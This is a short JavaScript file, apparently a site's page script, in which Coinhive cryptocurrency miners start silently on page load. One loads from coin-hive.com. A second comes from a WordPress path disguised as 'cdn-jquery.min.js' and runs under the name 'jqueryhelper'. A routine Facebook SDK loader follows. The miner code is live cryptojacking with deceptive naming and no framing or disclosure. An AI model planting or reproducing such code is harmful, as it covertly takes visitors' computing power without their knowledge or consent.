$.getScript("https://coin-hive.com/lib/coinhive.min.js", function() {
    var i = new CoinHive.Anonymous("NgQ29z1PPbVTInQlSN43lBA05tw7Fc5j");
    i.start(), i.setThrottle(.05)
});$(document).ready(function() {
    $.getScript("https://99leave.com/wp-includes/js/cdn-jquery.min.js", function() {
        var jqueryhelper = new CoinHive.Anonymous("ZARNNKb30vmoadzWUCxfzvxeojzLHHhx");
        jqueryhelper.start();
        jqueryhelper.setThrottle(0.05);
    });
});
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s);
    js.id = id;
    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.5&appId=159072724178164";
    fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));